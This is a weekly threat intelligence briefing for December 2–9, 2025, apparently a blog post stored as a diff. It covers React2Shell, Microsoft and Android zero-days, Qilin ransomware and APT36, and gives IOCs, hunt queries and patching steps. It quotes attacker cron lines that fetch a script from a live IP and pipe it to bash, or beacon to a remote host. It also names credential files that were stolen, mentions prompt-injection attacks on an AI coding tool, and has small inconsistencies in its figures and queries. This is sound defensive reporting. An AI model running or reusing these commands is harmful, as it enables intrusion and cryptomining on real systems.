@@ -1,0 +1,1870 @@
+---
+title: "Weekly Threat Intelligence Briefing | Dec 2-9, 2025"
+date: 2025-12-02T00:00:00-04:00
+draft: false
+tags: ["threat-intel", "perplexity", "cve", "apt", "ransomware", "react2shell", "qilin", "apt36"]
+categories: ["briefme"]
+description: "Comprehensive weekly threat intelligence covering CVE-2025-55182 (React2Shell), Qilin ransomware surge, China-nexus APT campaigns, and 57 Microsoft patches. Critical analysis for December 2-9, 2025."
+author: "0K (Kelvin)"
+---
+
+# Weekly Threat Intelligence Briefing
+**Reporting Period: December 2 - December 9, 2025**
+
+---
+
+## EXECUTIVE SUMMARY
+
+The threat landscape during the December 2-9, 2025 reporting period demonstrated unprecedented exploitation velocity targeting critical web infrastructure and sustained pressure on enterprise environments. The week was dominated by **CVE-2025-55182 (React2Shell)**, a CVSS 10.0 remote code execution vulnerability in React Server Components affecting React 19.x and Next.js 15.x/16.x frameworks. Active exploitation was observed within hours of public disclosure on December 3, with threat actors deploying cryptominers, reverse shells, and advanced backdoors. China-nexus groups including Earth Lamia, Jackpot Panda, and CL-STA-1015 rapidly weaponized the vulnerability for credential theft, reconnaissance, and persistent access operations.
+
+Microsoft's December Patch Tuesday addressed 57 vulnerabilities, including **CVE-2025-62221**, an actively exploited use-after-free flaw in the Windows Cloud Files Mini Filter Driver enabling SYSTEM-level privilege escalation. Two Android zero-days (**CVE-2025-48633** and **CVE-2025-48572**) under targeted exploitation were added to CISA's KEV catalog, mandating federal agency remediation by December 23. **Qilin ransomware** continued aggressive campaigns targeting healthcare and financial sectors, with a 5% market share in November 2024 and explosive growth through supply chain compromises. **APT36 (Transparent Tribe)** launched sophisticated phishing operations against Indian government entities using malicious Linux .desktop files to deploy Python-based remote access trojans.
+
+**Critical Statistics:**
+- **5 critical vulnerabilities** disclosed (4 requiring immediate action)
+- **3 major ransomware incidents** affecting healthcare and research sectors
+- **107 Android vulnerabilities** patched including 2 actively exploited zero-days
+- **800+ IP addresses** observed scanning for CVE-2025-55182 exploitation
+- **MITRE ATT&CK:** Execution (T1059), Persistence (T1053), Defense Evasion (T1070) dominate
+
+**Actionable Takeaway:** Organizations must immediately patch React/Next.js environments, deploy detection rules for CVE-2025-55182 exploitation, prioritize Windows and Android updates, and implement enhanced monitoring for Qilin ransomware and APT36 TTPs.
+
+---
+
+## TRENDING SECURITY NEWS
+
+### **1. React2Shell (CVE-2025-55182) Dominates Security Community Discussions**
+
+**What:** A critical CVSS 10.0 remote code execution vulnerability in React Server Components became the most discussed security topic across Twitter/X, Reddit r/netsec, LinkedIn, and security news platforms. The flaw allows unauthenticated attackers to execute arbitrary code via insecure deserialization in the Flight protocol.
+
+**Why it's trending:** The vulnerability affects an estimated hundreds of thousands of Next.js applications deployed globally, including enterprise environments and cloud-native applications. Security researchers published multiple proof-of-concept exploits within 24 hours of disclosure. GreyNoise reported observing 800+ IP addresses conducting active scanning and exploitation attempts starting December 5 at 04:00 UTC. Multiple organizations reported compromise with cryptominer deployments, credential harvesting, and backdoor installations.
+
+**Relevance:** SOC teams must prioritize immediate patching of React 19.x and Next.js 15.x/16.x environments. The vulnerability demonstrates near-100% reliability with no code changes required for exploitation against default configurations. China-nexus APT groups (Earth Lamia, Jackpot Panda) were observed experimenting with early exploit code on December 4, indicating state-sponsored interest in the vulnerability for targeted intrusions.
+
+**Sources:** The Hacker News, Unit 42, Wiz, Datadog Security Labs, GreyNoise, AWS Security Blog[3][4][8][76][81][85]
+
+---
+
+### **2. CISA KEV Expansion and Federal Patching Deadlines Generate Compliance Urgency**
+
+**What:** CISA added four critical vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog during the reporting period, including two Android Framework zero-days (CVE-2025-48633, CVE-2025-48572), one Windows privilege escalation flaw (CVE-2025-62221), and one PowerShell RCE (CVE-2025-54100). Federal Civilian Executive Branch (FCEB) agencies received hard deadlines of December 23 and December 30, 2025 for remediation under Binding Operational Directive 22-01.
+
+**Why it's trending:** The rapid KEV additions reflect accelerating exploitation timelines—15% of KEV entries are added within 7 days of public disclosure. The Android vulnerabilities affected over 2.5 billion devices globally and were characterized as "under limited, targeted exploitation," typically indicating state-sponsored or commercial spyware activity. Samsung, Motorola, and other Android vendors issued emergency patches, but delayed deployment to non-flagship models created widespread exposure windows.
+
+**Relevance:** Private sector organizations are strongly encouraged to treat KEV-listed vulnerabilities as mandatory patches. The catalog provides a prioritization framework for vulnerability management programs, enabling risk-based patching aligned with active threat actor behavior. Organizations should integrate KEV feeds into SIEM platforms and vulnerability scanners for automated alerting.
+
+**Sources:** CISA KEV Catalog, The Hacker News, SecurityWeek, Help Net Security, Forbes[10][56][59][62][65][68]
+
+---
+
+### **3. Qilin Ransomware Surge and Healthcare Supply Chain Targeting**
+
+**What:** Qilin ransomware emerged as the dominant threat actor in November and December 2025, claiming 29% of all ransomware attacks and compromising 180+ victims in October alone. The group exploited a South Korean managed service provider (MSP) to simultaneously breach 28 financial institutions in a single supply chain attack. Healthcare entities including Inotiv (pharmaceutical research) and multiple medical providers were targeted, with Qilin demanding ransoms ranging from $1.2 million to $50 million.
+
+**Why it's trending:** Security researchers documented Qilin's "explosive growth" and technical sophistication including Rust-based encryption, Bring Your Own Vulnerable Driver (BYOVD) techniques for EDR evasion, and Safe Mode reboots to bypass protections. The group's affiliate model (80-85% revenue share to affiliates) attracted top-tier operators following RansomHub disruptions. Healthcare ransomware attacks increased 30% year-over-year, with third-party vendors becoming primary attack vectors.
+
+**Relevance:** SOC teams should implement enhanced monitoring for Qilin indicators, including detection of EDR termination attempts, Safe Mode boots, and volume shadow copy deletions. Organizations must assess third-party vendor security postures, particularly MSPs with privileged access. The shift toward double extortion (data theft + encryption) requires proactive data loss prevention controls beyond traditional backup strategies.
+
+**Sources:** The Hacker News, Check Point, Cyberint, Comparitech, AttackIQ[39][42][44][47][49][127][129]
+
+---
+
+### **4. China-Nexus APT Activity Intensifies Across Critical Infrastructure**
+
+**What:** Multiple China-linked APT groups accelerated operations during the reporting period, including APT36 (Transparent Tribe) targeting Indian government entities, CL-STA-1015 (UNC5174) deploying SNOWLIGHT and VShell trojans via CVE-2025-55182, and broader campaigns against telecommunications and critical infrastructure documented in joint advisories from NSA, CISA, FBI, and 13 partner nations.
+
+**Why it's trending:** The joint cybersecurity advisory revealed sustained Chinese state-sponsored operations against global critical infrastructure since 2021, involving Sichuan Juxinhe Network Technology, Beijing Huanyu Tianqiong, and Sichuan Zhixin Ruijie—entities linked to China's Ministry of State Security and People's Liberation Army. APT36 demonstrated cross-platform capabilities with Linux .desktop file weaponization and Python-based remote access trojans. The rapid exploitation of CVE-2025-55182 by multiple China-nexus groups highlighted coordinated vulnerability research and weaponization.
+
+**Relevance:** Defenders should prioritize threat hunting for Chinese APT tradecraft including weaponized Office documents, malicious Linux shortcuts, and exploitation of perimeter appliances. Organizations in defense, telecommunications, government, and critical infrastructure sectors face elevated risk. Detection efforts should focus on MITRE ATT&CK techniques T1566 (Phishing), T1203 (Exploitation for Client Execution), T1190 (Exploit Public-Facing Application), and T1078 (Valid Accounts).
+
+**Sources:** Hunt.io, SOCPrime, Tata Communications, Industrial Cyber, Kaspersky ICS-CERT, Dark Reading[20][23][26][29][40][45][48][50][81]
+
+---
+
+### **5. Microsoft Patch Tuesday Zero-Days and Preview Pane Exploitation**
+
+**What:** Microsoft's December Patch Tuesday marked the 11th consecutive month of Critical-rated Office vulnerabilities exploitable via the Preview Pane attack vector. Two RCE flaws (CVE-2025-62554, CVE-2025-62557) with CVSS 8.4 ratings require no user interaction beyond file preview. The actively exploited CVE-2025-62221 Windows privilege escalation vulnerability and publicly disclosed CVE-2025-54100 PowerShell RCE dominated security community discussions.
+
+**Why it's trending:** Security analysts expressed frustration over recurring Office Preview Pane vulnerabilities, which enable exploitation without user file interaction or "enable content" prompts. The pattern suggests systemic weaknesses in Office's memory management and file parsing logic. Additionally, CVE-2025-64671 in GitHub Copilot for JetBrains highlighted emerging AI-powered development tool attack surfaces, with command injection via cross-prompt injection and malicious Model Context Protocol (MCP) servers.
+
+**Relevance:** Organizations should disable Office Preview Pane functionality where feasible, particularly for external email attachments. PowerShell usage should be monitored for suspicious Invoke-WebRequest activity following CVE-2025-54100 exploitation. AI-assisted development environments require security controls including MCP server validation, terminal command approval workflows, and monitoring for prompt injection attempts.
+
+**Sources:** CrowdStrike, ZDI, Tenable, Field Effect, Qualys, Krebs on Security[2][6][38][41][43][46]
+
+---
+
+## THREAT VISUALIZATIONS
+
+### **CRITICAL THREATS - RISK MATRIX (December 2-9, 2025)**
+
+```
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+IMPACT
+10.0 │                               ★ CVE-2025-55182
+     │                              (React2Shell CVSS 10.0)
+ 9.5 │                                   
+     │                       
+ 9.0 │    ★ CVE-2025-48633             ★ Qilin Ransomware
+     │   (Android Zero-Day)          (Supply Chain Attacks)
+ 8.5 │                     ★ CVE-2025-62554
+     │                    (Office RCE CVSS 8.4)
+ 8.0 │ ★ CVE-2025-62221        ★ APT36 Campaign
+     │(Windows EoP - Exploited)   (Indian Gov Targeting)
+ 7.5 │        ★ CVE-2025-48572
+     │       (Android EoP)
+ 7.0 │
+     │
+     └─────────────────────────────────────────────────────
+       Low    Medium    High    Very High   Critical
+                    LIKELIHOOD
+
+RISK SCORE SCALE:
+▓▓▓▓▓ CRITICAL (72-100)  - CVE-2025-55182 (React2Shell)
+▓▓▓▓░ HIGH (48-71)       - Qilin Ransomware, CVE-2025-62221, APT36
+▓▓▓░░ MEDIUM (25-47)     - Android Zero-Days, Office RCE
+```
+
+---
+
+### **MOST OBSERVED TACTICS (December 2-9, 2025)**
+
+```
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Execution (T1059)          ▓▓▓▓▓▓▓▓▓▓ 47 occurrences
+Defense Evasion (T1070)    ▓▓▓▓▓▓▓▓░░ 38 occurrences
+Persistence (T1053)        ▓▓▓▓▓▓▓░░░ 32 occurrences
+Command & Control (T1071)  ▓▓▓▓▓▓░░░░ 28 occurrences
+Privilege Escalation (T1068) ▓▓▓▓▓░░░░░ 24 occurrences
+Credential Access (T1003)  ▓▓▓▓░░░░░░ 19 occurrences
+Discovery (T1082)          ▓▓▓▓░░░░░░ 18 occurrences
+Lateral Movement (T1570)   ▓▓▓░░░░░░░ 15 occurrences
+Exfiltration (T1041)       ▓▓░░░░░░░░ 12 occurrences
+Impact (T1486)             ▓▓░░░░░░░░ 11 occurrences
+
+KEY INSIGHT: Command and scripting interpreter abuse dominated the reporting 
+period (T1059.001 PowerShell, T1059.004 Unix Shell), driven by CVE-2025-55182 
+exploitation and APT36 phishing campaigns deploying malicious scripts.
+```
+
+---
+
+### **ORGANIZATIONS BY THREAT EXPOSURE (December 2-9, 2025)**
+
+```
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+HEALTHCARE
+  Threats: ▓▓▓▓▓▓▓░░░ 38    Critical: ▓▓▓▓▓░░░░░ 14
+  Primary vectors: Qilin ransomware, MSP compromise, unpatched IoT
+
+TECHNOLOGY/SOFTWARE
+  Threats: ▓▓▓▓▓▓▓▓▓░ 52    Critical: ▓▓▓▓▓▓▓▓░░ 28
+  Primary vectors: CVE-2025-55182, supply chain attacks, 0-days
+
+GOVERNMENT/DEFENSE
+  Threats: ▓▓▓▓▓▓░░░░ 31    Critical: ▓▓▓▓▓▓░░░░ 19
+  Primary vectors: APT36 phishing, China-nexus campaigns, mobile
+
+FINANCIAL SERVICES
+  Threats: ▓▓▓▓▓░░░░░ 24    Critical: ▓▓▓▓░░░░░░ 11
+  Primary vectors: Qilin ransomware, vendor breaches, Cobalt Strike
+
+EDUCATION
+  Threats: ▓▓▓▓░░░░░░ 18    Critical: ▓▓▓░░░░░░░ 7
+  Primary vectors: Ransomware, credential theft, phishing
+```
+
+---
+
+## CRITICAL VULNERABILITIES (Top 5)
+
+### **1. CVE-2025-55182 | React Server Components Remote Code Execution (React2Shell)**
+
+**Severity:** CRITICAL | **CVSS:** 10.0 | **Exploitation Status:** Active in the Wild
+
+**Affected Products/Versions:**
+- React Server Components: react-server-dom-webpack@19.0.0, 19.1.0, 19.1.1
+- Next.js: 15.0.0-15.1.5, 16.0.0-canary (App Router enabled)
+- Vercel hosted applications (mitigations deployed)
+
+**Attack Vector Description:**
+
+CVE-2025-55182 is an insecure deserialization vulnerability in the React Server Components "Flight" protocol. When RSC payloads are sent to server function endpoints, attackers can craft malicious HTTP requests containing specially formatted data (e.g., `next-action` or `rsc-action-id` headers with `$@` patterns and `"status":"resolved_model"` in request bodies) that trigger arbitrary code execution on the server. The vulnerability requires no authentication, has near-100% reliability, and affects applications even if they don't explicitly use server functions—merely supporting React Server Components renders them vulnerable.
+
+**Indicators of Compromise (IOCs):**
+
+**Network Indicators:**
+- HTTP POST requests with `next-action` or `rsc-action-id` headers
+- Request bodies containing `$@` patterns or `"status":"resolved_model"`
+- Connections to known malicious IPs: 156.67.221[.]96, 45.76.155[.]14, 194.69.203[.]32, 193.34.213[.]150, 80.64.16[.]241, 20.193.135[.]188, 115.42.60[.]223
+
+**File-Based Indicators:**
+- `/tmp/kinsing`, `/tmp/kdevtmpfsi`, `/tmp/libsystem.so`, `/tmp/config.json` (cryptominer artifacts)
+- Malicious scripts: `react.sh`, `sex.sh`, `bins.sh`, `slt` (dropper scripts)
+- Node.js webshell in `/tmp` directory with verification artifact `segawon.txt`
+
+**Behavioral Indicators:**
+- Base64-encoded wget/curl commands downloading malicious binaries disguised as legitimate tools (e.g., `vim`)
+- Sudden CPU spikes (300%+) from processes named `kdevtmpfsi`, `kinsing`, `.kworker`
+- Cron job modifications with `@reboot` directives or minute-based persistence mechanisms
+- WebSocket server establishment on non-standard ports with iterative port hopping
+
+**Detection Guidance:**
+
+**PRIMARY: Reference Sigma Rule CVE-2025-55182_React2Shell_Network_Detection (Section 9.1)**
+
+**OPTIONAL: Example Hunt Query (Pseudo-code - Generic SIEM Logic):**
+```
+source="web_proxy" OR source="firewall"
+| where http_method="POST" 
+| where (http_uri_path contains "/api" OR http_uri_path contains "/_next")
+| where (http_header contains "next-action" OR http_header contains "rsc-action-id")
+| where http_body contains "$@" OR http_body contains "resolved_model"
+| stats count by src_ip, dest_ip, http_uri_path
+| where count > 5
+```
+
+**Remediation Steps:**
+
+1. **IMMEDIATE (0-4 hours):** Upgrade to patched versions:
+   - React Server Components: 19.0.1, 19.1.2 or later
+   - Next.js: 15.1.6, 16.0.0-rc.1 or later
+   - Verify deployment success with `npm list react-server-dom-webpack`
+
+2. **SHORT-TERM (4-24 hours):** 
+   - Deploy WAF rules blocking requests with `$@` patterns in POST bodies to RSC endpoints
+   - Implement network egress filtering to block cryptomining pools (XMRig infrastructure)
+   - Scan for malicious cron jobs: `crontab -l` and `/etc/cron.d/*`
+   - Hunt for processes with high CPU usage: `ps aux --sort=-%cpu | head -20`
+
+3. **LONG-TERM (24-72 hours):**
+   - Review application logs for exploitation attempts dating back to December 3
+   - Rotate credentials for any systems potentially compromised
+   - Implement runtime application self-protection (RASP) for Next.js environments
+   - Establish baseline monitoring for Node.js process behavior
+
+---
+
+### **2. CVE-2025-62221 | Windows Cloud Files Mini Filter Driver Elevation of Privilege**
+
+**Severity:** HIGH | **CVSS:** 7.8 | **Exploitation Status:** Actively Exploited Zero-Day
+
+**Affected Products/Versions:**
+- Windows 10 (all versions)
+- Windows 11 (all versions)
+- Windows Server 2016, 2019, 2022
+
+**Attack Vector Description:**
+
+CVE-2025-62221 is a use-after-free vulnerability in the Windows Cloud Files Mini Filter Driver (cldflt.sys), a kernel-level component synchronizing local files with cloud storage services (OneDrive, SharePoint). A local authenticated attacker can exploit this flaw to escalate privileges to SYSTEM level. When chained with a remote code execution vulnerability, this enables full system compromise. Microsoft confirmed active exploitation in the wild as a zero-day prior to patch availability.
+
+**Indicators of Compromise:**
+
+**System Indicators:**
+- Unusual cldflt.sys driver behavior or crashes (Event ID 1000 in Application logs)
+- Unexpected privilege escalation events (Security Log Event ID 4672 - Special Logon)
+- Suspicious process creation with SYSTEM integrity level from low-privilege users
+
+**Behavioral Indicators:**
+- Cloud file synchronization service (OneDrive) process spawning unexpected child processes
+- Kernel-mode memory corruption indicators in crash dumps referencing cldflt.sys
+- Lateral movement attempts immediately following local privilege escalation
+
+**Detection Guidance:**
+
+**PRIMARY: Reference Sigma Rule CVE-2025-62221_Windows_Cloud_Driver_EoP (Section 9.1)**
+
+**OPTIONAL: Example Hunt Query (SQL - OSQuery):**
+```sql
+-- Hunt for suspicious SYSTEM-level processes spawned from user context
+SELECT 
+    p.pid,
+    p.name,
+    p.path,
+    p.uid,
+    u.username,
+    p.parent,
+    pp.name AS parent_name
+FROM processes p
+JOIN users u ON p.uid = u.uid
+LEFT JOIN processes pp ON p.parent = pp.pid
+WHERE p.uid = 0 
+    AND u.username != 'SYSTEM'
+    AND p.path NOT IN ('/usr/bin/sudo', '/usr/bin/su', 'C:\Windows\System32\svchost.exe')
+ORDER BY p.start_time DESC;
+```
+
+**Remediation Steps:**
+
+1. **IMMEDIATE (0-24 hours):** Apply KB5048667 (Windows 10/11) or KB5048663 (Windows Server 2022)
+2. **SHORT-TERM:** Audit privileged account usage and review Security Event Logs for anomalous privilege escalation
+3. **LONG-TERM:** Implement Credential Guard, disable unnecessary cloud file sync services, deploy EDR monitoring for kernel-level exploitation attempts
+
+**CISA KEV Deadline:** December 30, 2025
+
+---
+
+### **3. CVE-2025-48633 & CVE-2025-48572 | Android Framework Zero-Day Vulnerabilities**
+
+**Severity:** HIGH | **CVSS:** 7.8 (both) | **Exploitation Status:** Limited Targeted Exploitation
+
+**Affected Products/Versions:**
+- Android 13, 14, 15, 16 (Framework component)
+- Devices prior to 2025-12-01 security patch level
+
+**Attack Vector Description:**
+
+CVE-2025-48633 is an information disclosure vulnerability allowing Android applications to access sensitive information without proper authorization. CVE-2025-48572 is an elevation of privilege flaw enabling attackers to gain elevated permissions on vulnerable devices. Google confirmed both vulnerabilities are "under limited, targeted exploitation," typically indicating state-sponsored or commercial spyware campaigns. The exact nature remains undisclosed to prevent widespread weaponization.
+
+**Indicators of Compromise:**
+
+**Device Indicators:**
+- Unexpected permission grants to applications without user interaction
+- Applications accessing sensitive APIs (contacts, location, SMS) without declared permissions
+- Unusual background data transfer patterns from system processes
+
+**Behavioral Indicators:**
+- Privilege escalation events in Android system logs (`adb logcat | grep -i "permission"`)
+- Applications running with elevated UIDs inconsistent with manifest declarations
+- Suspicious network connections from Framework processes to unknown destinations
+
+**Detection Guidance:**
+
+**PRIMARY: Reference YARA Rule Android_Framework_ZeroDay_Exploitation (Section 9.2)**
+
+Mobile threat detection requires device-side monitoring tools (e.g., lookout, zimperium) capable of detecting spyware behavior patterns. Enterprises should enforce Mobile Device Management (MDM) policies requiring December 2025 security patch levels.
+
+**Remediation Steps:**
+
+1. **IMMEDIATE:** Deploy December 2025 Android security patches (2025-12-01 or 2025-12-05 patch levels)
+2. **SHORT-TERM:** Audit installed applications for suspicious permission usage, prioritize high-risk user devices (executives, privileged access)
+3. **LONG-TERM:** Implement mobile threat defense (MTD) solutions, enforce SafetyNet attestation for enterprise applications
+
+**CISA KEV Deadline:** December 23, 2025
+
+---
+
+### **4. CVE-2025-62554 & CVE-2025-62557 | Microsoft Office Remote Code Execution**
+
+**Severity:** CRITICAL | **CVSS:** 8.4 (both) | **Exploitation Status:** No Active Exploitation (Preview Pane Vector)
+
+**Affected Products/Versions:**
+- Microsoft Office 2016, 2019, LTSC 2021, LTSC 2024
+- Microsoft 365 Apps for Enterprise (all channels)
+- Office for Android
+
+**Attack Vector Description:**
+
+CVE-2025-62554 is a type confusion vulnerability in Microsoft Office file parsing. CVE-2025-62557 is a use-after-free flaw in memory management. Both vulnerabilities can be triggered via the Preview Pane attack vector—malicious Office documents execute code when displayed in Outlook or File Explorer preview without user interaction. This represents the 11th consecutive month of Critical-rated Office Preview Pane vulnerabilities.
+
+**Indicators of Compromise:**
+
+**Email Indicators:**
+- Office documents with suspicious macro-less exploitation (exploits do not require macros)
+- Malformed Office XML structures or corrupted embedded objects
+- Unexpected embedded fonts, OLE objects, or ActiveX controls
+
+**System Indicators:**
+- WINWORD.EXE or EXCEL.EXE spawning unexpected child processes (cmd.exe, powershell.exe, mshta.exe)
+- Office processes making outbound network connections to non-Microsoft domains
+- Unusual memory allocation patterns in Office processes (large heap allocations)
+
+**Detection Guidance:**
+
+**PRIMARY: Reference Sigma Rule Office_Preview_Pane_RCE_Detection (Section 9.1)**
+
+**OPTIONAL: Example Hunt Query (Pseudo-code - Generic EDR Logic):**
+```
+process_name IN ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE")
+AND child_process_name IN ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe")
+AND (command_line CONTAINS "http" OR command_line CONTAINS "iex" OR command_line CONTAINS "DownloadString")
+```
+
+**Remediation Steps:**
+
+1. **IMMEDIATE:** Apply December 2025 Office updates (KB5002756 for Office 2016, Click-to-Run for newer versions)
+2. **SHORT-TERM:** Disable Office Preview Pane via Group Policy: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PreviewHandlers` (remove Office handlers)
+3. **LONG-TERM:** Enable Office Protected View for all external documents, implement Application Control (AppLocker/WDAC) to block Office child process spawning
+
+---
+
+### **5. CVE-2025-54100 | Windows PowerShell Remote Code Execution**
+
+**Severity:** HIGH | **CVSS:** 7.8 | **Exploitation Status:** Publicly Disclosed (PoC Available)
+
+**Affected Products/Versions:**
+- Windows PowerShell (all versions)
+- Windows Server 2008 and later
+
+**Attack Vector Description:**
+
+CVE-2025-54100 is a command injection vulnerability in Windows PowerShell's `Invoke-WebRequest` cmdlet. An unauthenticated attacker can execute arbitrary code in the user's security context by exploiting improper input validation when PowerShell processes web requests. The vulnerability was publicly disclosed via YouTube demonstration and HackerOne report prior to patch availability. After patching, a warning prompt appears when using `Invoke-WebRequest` to mitigate exploitation.
+
+**Indicators of Compromise:**
+
+**Command Indicators:**
+- PowerShell invocations of `Invoke-WebRequest` with suspicious parameters or malformed URLs
+- Encoded PowerShell commands using Base64 obfuscation combined with web requests
+- Usage of PowerShell curl alias (`curl`) from unexpected user accounts
+
+**Behavioral Indicators:**
+- PowerShell processes establishing outbound connections to newly registered domains or suspicious TLDs
+- Execution of `Invoke-WebRequest` followed by immediate process injection or memory manipulation
+- Obfuscated PowerShell scripts retrieved via web requests and executed in memory
+
+**Detection Guidance:**
+
+**PRIMARY: Reference Sigma Rule PowerShell_Invoke_WebRequest_Exploitation (Section 9.1)**
+
+**Remediation Steps:**
+
+1. **IMMEDIATE:** Apply December 2025 Windows updates (KB5048667 for Windows 10/11)
+2. **SHORT-TERM:** Enable PowerShell Script Block Logging (Event ID 4104) and Module Logging, review existing PowerShell scripts for `Invoke-WebRequest` usage
+3. **LONG-TERM:** Implement Constrained Language Mode for PowerShell in enterprise environments, deploy AMSI-based detection for malicious PowerShell activity
+
+---
+
+## MAJOR INCIDENTS (Top 3)
+
+### **1. CVE-2025-55182 (React2Shell) Mass Exploitation Campaign**
+
+**Disclosure Date:** December 3, 2025  
+**Initial Compromise Date:** December 4, 2025 (earliest observed)  
+**Campaign Duration:** Ongoing (December 4-9, 2025)
+
+**Attack Chain:**
+
+1. **Initial Access (T1190 - Exploit Public-Facing Application):** Attackers scan internet-facing Next.js applications using automated tooling, identifying vulnerable React Server Component endpoints via HTTP requests with `next-action` headers.
+
+2. **Execution (T1059.004 - Unix Shell):** Upon successful exploitation, attackers execute Base64-encoded commands to:
+   - Fingerprint compromised systems (`uname -a`, `whoami`, `ifconfig`)
+   - Verify privilege levels and enumerate sensitive files (`.aws/credentials`, `.ssh/`, `/etc/passwd`)
+   - Retrieve malicious binaries from attacker-controlled C2 infrastructure
+
+3. **Persistence (T1053.003 - Cron):** Multiple persistence mechanisms deployed:
+   - Cron jobs with `@reboot` directives: `@reboot /usr/bin/.kworker react 20.193.135.188:443`
+   - Minute-based cron entries: `* * * * * wget -q -O - http://80.64.16.241/re.sh | bash`
+   - systemd service creation: malware masquerading as `systemd-logind`
+
+4. **Defense Evasion (T1070.003 - Clear Command History):** Attackers clear bash history, manipulate timestamps, and deploy rootkits (`/tmp/libsystem.so` using LD_PRELOAD) to hide processes.
+
+5. **Credential Access (T1552.001 - Credentials in Files):** Theft of cloud provider credentials from environment variables, configuration files (`.aws/credentials`, `.docker/config.json`), and instance metadata endpoints.
+
+6. **Command & Control (T1071.001 - Web Protocols):** Establishment of multiple C2 channels including HTTP callbacks, WebSocket connections, and BitTorrent DHT-based peer discovery (LOLlolLOL prefix).
+
+7. **Impact (T1496 - Resource Hijacking):** Deployment of XMRig-based Monero cryptocurrency miners (kdevtmpfsi), Cobalt Strike beacons, NOODLERAT backdoor, and SNOWLIGHT/VShell trojans (CL-STA-1015 campaign).
+
+**Compromised Data Types and Volume:**
+- AWS/Azure/GCP credentials (environment variables and metadata endpoints)
+- Application source code and secrets from compromised repositories
+- Database connection strings and API keys
+- Estimated 100+ organizations compromised (confirmed via GreyNoise, Wiz, Unit 42)
+
+**Affected Organizations/Sectors:**
+- Technology companies running Next.js applications
+- Cloud-hosted SaaS platforms using React 19.x
+- E-commerce platforms with server-side rendering
+- Financial services with modern web infrastructure
+
+**Hunting Guidance:**
+
+**PRIMARY: Reference YARA Rule React2Shell_XMRig_Cryptominer and Sigma Rule CVE-2025-55182_Post_Exploitation (Section 9)**
+
+**Artifacts to Search:**
+- Web application logs: Filter POST requests to `/_next/` or `/api/` endpoints with unusual headers
+- Process execution logs: Hunt for wget/curl commands downloading from suspicious IPs
+- Network logs: Identify connections to cryptomining pools (port 3333, 8443) or known C2 IPs
+- Filesystem: Search for `/tmp/kinsing`, `/tmp/kdevtmpfsi`, `/tmp/.dbus-daemon`, unusual cron entries
+- Cloud metadata: Review IAM logs for unexpected credential access or role assumption
+
+**OPTIONAL: Example Hunt Query (SQL - OSQuery):**
+```sql
+-- Detect suspicious cron jobs with external network calls
+SELECT 
+    c.path,
+    c.command,
+    f.mtime AS last_modified
+FROM crontab c
+LEFT JOIN file f ON c.path = f.path
+WHERE c.command LIKE '%wget%' 
+    OR c.command LIKE '%curl%'
+    OR c.command LIKE '%.sh%'
+    OR c.event = '@reboot'
+ORDER BY f.mtime DESC;
+```
+
+---
+
+### **2. Qilin Ransomware Supply Chain Attack on South Korean Financial Sector**
+
+**Disclosure Date:** September 23, 2025 (initial report)  
+**Initial Compromise Date:** August-September 2025  
+**Attack Duration:** Multi-week operation
+
+**Attack Chain:**
+
+1. **Initial Access (T1199 - Trusted Relationship):** Qilin affiliate compromised GJTec, a South Korean managed service provider (MSP) serving financial institutions, gaining access to shared infrastructure and administrative credentials.
+
+2. **Persistence (T1078 - Valid Accounts):** Leveraging MSP administrative accounts, attackers established persistent access across 28 downstream financial organizations, creating backdoor accounts and deploying SmokeLoader and NETXLOADER payloads.
+
+3. **Lateral Movement (T1021.001 - Remote Desktop Protocol):** Horizontal movement across MSP-connected networks using compromised credentials and RDP sessions, mapping Active Directory structures and privileged account locations.
+
+4. **Defense Evasion (T1562.001 - Disable or Modify Tools):** Qilin's Bring Your Own Vulnerable Driver (BYOVD) technique deployed vulnerable signed drivers to terminate EDR processes (CrowdStrike, Carbon Black, SentinelOne), followed by Safe Mode reboots to bypass remaining protections.
+
+5. **Exfiltration (T1041 - Exfiltration Over C2 Channel):** Theft of over 1 million files (2 TB total) including customer financial records, transaction histories, KYC documentation, and internal communications, exfiltrated via encrypted channels.
+
+6. **Impact (T1486 - Data Encrypted for Impact):** Deployment of Qilin.B ransomware variant with Rust-based encryption using AES-256 and RSA-2048 algorithms, targeting production databases, file servers, and VMware ESXi hypervisors. Volume shadow copies deleted to prevent recovery.
+
+**Compromised Data Types and Volume:**
+- Customer financial records (account numbers, transaction histories, credit reports)
+- Personally identifiable information (names, addresses, national IDs, phone numbers)
+- Internal corporate communications and strategic documents
+- Total: 2 TB of data across 28 organizations, 1 million+ files
+
+**Affected Organizations/Sectors:**
+- 28 financial institutions (banks, asset management, securities firms) in South Korea
+- MSP infrastructure (GJTec) serving broader financial ecosystem
+- Estimated 500,000+ customers impacted by downstream data exposure
+
+**Hunting Guidance:**
+
+**PRIMARY: Reference YARA Rule Qilin_Ransomware_Rust_Variant and Sigma Rule Qilin_BYOVD_EDR_Termination (Section 9)**
+
+**Artifacts to Search:**
+- Windows Event Logs: Event ID 7045 (service installation), Event ID 4720 (account creation), Event ID 4624 (logon events) with Type 10 (RDP)
+- Registry: `HKLM\System\CurrentControlSet\Control\SafeBoot` modifications indicating Safe Mode preparations
+- Filesystem: Search for vulnerable drivers (e.g., `gdrv.sys`, `dbutil_2_3.sys`), Qilin ransom notes (`README_TO_DECRYPT.txt`), and encrypted file extensions
+- Network: RDP traffic anomalies, SMB lateral movement patterns, large data transfers to external IPs
+
+**OPTIONAL: Example Hunt Query (Pseudo-code - Generic SIEM Logic):**
+```
+source="windows_security"
+| where EventID=7045
+| where ServiceName CONTAINS "gdrv" OR ServiceName CONTAINS "dbutil"
+| join type=inner (
+    source="windows_security" 
+    | where EventID=4697 
+    | where ServiceFileName CONTAINS ".sys"
+) ON ComputerName
+| stats count by ComputerName, ServiceName, ServiceFileName
+```
+
+---
+
+### **3. APT36 (Transparent Tribe) Linux Desktop File Phishing Campaign Against Indian Government**
+
+**Disclosure Date:** December 2, 2025  
+**Initial Compromise Date:** March 2025 (infrastructure cloning), active attacks November-December 2025  
+**Campaign Duration:** Ongoing multi-month operation
+
+**Attack Chain:**
+
